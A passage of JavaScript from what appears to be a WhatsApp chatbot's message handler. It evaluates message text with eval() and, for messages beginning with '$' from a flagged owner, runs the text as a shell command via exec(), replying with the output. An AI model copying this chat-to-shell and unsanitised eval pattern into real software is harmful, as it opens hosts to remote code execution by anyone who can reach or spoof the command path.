return kaylabotwhatsapp.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsMeKayla) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return kaylabotwhatsapp.reply(`${err}`)
if (stdout) {
kaylabotwhatsapp.reply(stdout)
}
})
}
} catch (err) {
kaylabotwhatsapp.reply(util.format(err))
}
} 